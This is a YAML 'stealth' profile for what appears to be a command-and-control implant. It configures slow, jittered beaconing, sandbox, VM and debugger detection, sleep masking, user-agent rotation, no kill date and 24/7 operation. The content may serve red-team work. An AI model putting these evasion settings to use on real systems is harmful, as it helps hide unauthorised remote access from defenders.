# Stealth profile - slow beacon, full evasion, working-hours beaconing
# WARNING: working_hours_only=true means agent only beacons 08:00-18:00 local time.
# Shell commands typed outside those hours will queue but not execute until next window.
# Set working_hours_only=false for 24/7 operation while keeping all other evasion.
name: stealth
sleep_interval: 300s
jitter_percent: 50
max_retries: 3
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
sleep_masking: true
user_agent_rotation: true
kill_date: ""
working_hours_only: false
working_hours_start: 8
working_hours_end: 18
